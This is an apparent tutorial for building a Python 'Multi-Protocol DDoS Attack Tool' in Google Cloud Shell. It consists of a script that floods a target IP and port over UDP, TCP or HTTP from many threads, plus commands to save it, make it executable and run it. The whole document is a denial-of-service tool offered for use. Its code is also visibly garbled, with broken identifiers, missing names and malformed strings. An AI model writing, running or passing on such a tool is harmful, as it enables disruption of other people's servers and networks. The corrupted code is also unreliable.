# Open Google Cloud Shell and paste the following commands:

# Create a new Python script file
nano ddos_attack.py

 Paste the following Python code into the file:
#!/usr/bin/env python3

import
import random
import threading
import socket
import time
import argparse

def udp_flood(target_ip, target_port, duration, threads):
 def send_packets():
 sock = socket.socket(socketF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 while True:
 sock.sendto(bytes, (target_ip, target_port))

 for _ in range(threads):
 thread = threading.Thread(target=send_packets)
 .start()

 print(f"[*] UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
 try:
 time.sleep(duration)
 except KeyboardInterrupt:
 pass
 print("[*] UDP Attack finished.")

def tcp_flood(target, target_port, duration, threads):
 def send_packets():
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
 try:
 sock.connect((target_ip, target_port))
 sock.send(b"GET / HTTP/1.1\rHost: " + target_ip.encode() + b"\r\n\r\n")
 sock.close()
 except:
 pass

 for _ in range(threads):
 thread = threading.Thread(target=send_packets)
 thread.start()

 print(f"[*] Starting TCP flood on {_ip}:{target_port} for {duration} seconds with {threads} threads.")
 try:
 time.sleep(duration)
 except KeyboardInterrupt:
 pass
 print("[*] TCP Attack finished.")

def http_flood(target_ip, target_port, duration, threads):
 def sendets():
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
 try:
 sock.connect((target_ip, target_port))
 sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\r\n")
 sock.close()
 except:
 pass

 for _ in range(threads):
 thread = threading.Thread(target=send_packets)
 thread.start()

 print(f"[*] Starting HTTP flood on {target_ip}:{target_port} for {duration} seconds withthreads} threads.")
 try:
 time.sleep(duration)
 except KeyboardInterrupt:
 pass
 print("[*] HTTP Attack finished.")

if __name__ == "__main__":
 parser = argparse.ArgumentParser(description="Multi-Protocol DDoS Attack Tool")
 parser.add_argument("_ip", help="Target IP address")
 parser.add_argument("target_port", type=int, help="Target port number")
 parser.add_argument("duration", type=int, help="Duration of the attack in seconds")
 parser.add_argument("threads", type=int, help="Number of threads to")
 parser.add_argument("protocol", choices=["udp", "tcp", "http"], help="Protocol to use for the attack")

 args = parser.parse_args()

 if args.protocol == "udp":
 udp_flood(args.target_ip, args.target_port, args.duration, argsthreads)
 elif args.protocol == "tcp":
 tcp_flood(args.target_ip, args.target_port, args.duration, args.threads)
 elif args.protocol == "http":
 http_flood(args.target_ip, args.target_port, args.duration, args.threads)

# Save and exit editor (Press CTRL+X, then Y, and ENTER)

# Make the script executable
chmod +x ddos_attack.py

# Run the script with your desired parameters
# Example: ./ddos_attack.py 192.168.1. 80 60 100 tcp
./ddos_attack.py <target_ip> <target_port> <duration> <threads> <protocol>
